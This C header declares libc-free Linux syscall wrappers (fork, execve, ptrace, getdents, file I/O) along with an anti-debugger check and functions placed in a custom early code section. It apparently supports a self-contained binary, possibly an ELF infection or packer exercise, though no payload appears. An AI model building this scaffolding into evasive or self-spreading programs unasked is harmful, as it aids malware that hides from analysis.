#ifndef LIB_H
# define LIB_H

#include <sys/types.h>
#include "bool.h"
#include <stddef.h>
#include <syscall.h>

size_t call(size_t p1, size_t p2, size_t p3, size_t sys_num, ...);
// rax      rdi        rsi        rdx        rcx         r8         r9        16(%rbp)
// rax      rdi        rsi        rdx        rax         r10        r8        r9

#define CALL(X,a1,a2,a3,...)		call((size_t)(a1), (size_t)(a2), (size_t)(a3), X, ##__VA_ARGS__)
#define CALL0(X)			CALL(X, 0, 0, 0)
#define CALL1(X,a1)			CALL(X, a1, 0, 0)
#define CALL2(X,a1,a2)			CALL(X, a1, a2, 0)

#define max(a, b) ((a) > (b) ? (a) : (b))
#define min(a, b) ((a) <= (b) ? (a) : (b))

#define SYS_MAX_ERRNO ((size_t)(4000))
#define SYS_ERROR ((size_t)(-1))
#define SYS_HAVE_FAIL(X) ((size_t)(X) > (size_t)(~0) - SYS_MAX_ERRNO)
#define SYS_RET(X) (SYS_HAVE_FAIL(X) ? SYS_ERROR : (size_t)(X))

void *ft_malloc(size_t size);
int ft_signal(int signum, void (*handler)(int));

size_t slen(const char *s);
void snbr(size_t nbr, char *sn);

void print(const char *s);
void println(const char *s);
void printnb(size_t nb);

int     sncmp(const char *s1, const char *s2, size_t n);
int fget(const char *filename, char **ptr, size_t *l);
int ffree(char *ptr, size_t l);
int fput(const char *filename, char *ptr, size_t l);
int str_equal(const char *s1, const char *s2);

int is_debbuger_on();
char *ft_getenv(char *k);
#include <dirent.h>

void add_base(char *tmp, char *dir, char *file, int lim);

struct linux_dirent {
	unsigned long	d_ino;
	int64_t		d_off;
	unsigned short	d_reclen;
	char		d_name[];
};

int d_isfile(struct linux_dirent *d);
int d_isdir(struct linux_dirent *d);

#include <sys/stat.h>

static inline __attribute__((section (".textearly"))) void ft_exit(int n)
{
	CALL1(SYS_exit, n);
	__builtin_unreachable();
}

static inline int ft_execve(const char *fichier, char *const argv[], char *const envp[])
{
	return CALL(SYS_execve, fichier, argv, envp);
}

static inline pid_t __attribute__((section (".textearly"))) ft_fork(void)
{
	return CALL0(SYS_fork);
}

static inline void ft_free(void *p)
{
	size_t *tab = p;
	CALL2(SYS_munmap, &tab[-1], tab[-1]);
}

static inline ssize_t ft_write(int fd, const void *s, size_t n)
{
	return CALL(SYS_write, fd, (size_t)s, n);
}

static inline ssize_t ft_read(int fd, void *s, size_t n)
{
	return CALL(SYS_read, fd, (size_t)s, n);
}

static inline int ft_close(int fd)
{
	return CALL1(SYS_close, fd);
}

static inline int ft_open(const char *filename, int flag, int mode)
{
	return CALL(SYS_open, (size_t)filename, flag, mode);
}

static inline off_t ft_lseek(int fd, off_t offset, int whence)
{
	return CALL(SYS_lseek, fd, offset, whence);
}

static inline __attribute__((section (".textearly"))) long ft_ptrace(long request, pid_t pid, void* addr, void *data){
	return CALL(SYS_ptrace, request, pid, addr, data);
}

static inline int ft_xstat(const char *filename, struct stat *buf){
	return CALL2(SYS_stat, filename, buf);
}

static inline __attribute__((section (".textearly"))) pid_t ft_waitpid(pid_t pid, int *stat_loc, int option){
	return CALL(SYS_wait4, pid, stat_loc, option, NULL);
}

static inline pid_t ft_wait(int *stat_loc){
	return ft_waitpid(-1, stat_loc, 0);
}

static inline int getdents(int fd, char *buff, size_t buff_size)
{
	return CALL(SYS_getdents, fd, buff, buff_size);
}

static inline pid_t __attribute__((section (".textearly"))) ft_getpid(void)
{
	return CALL0(SYS_getpid);
}

#endif
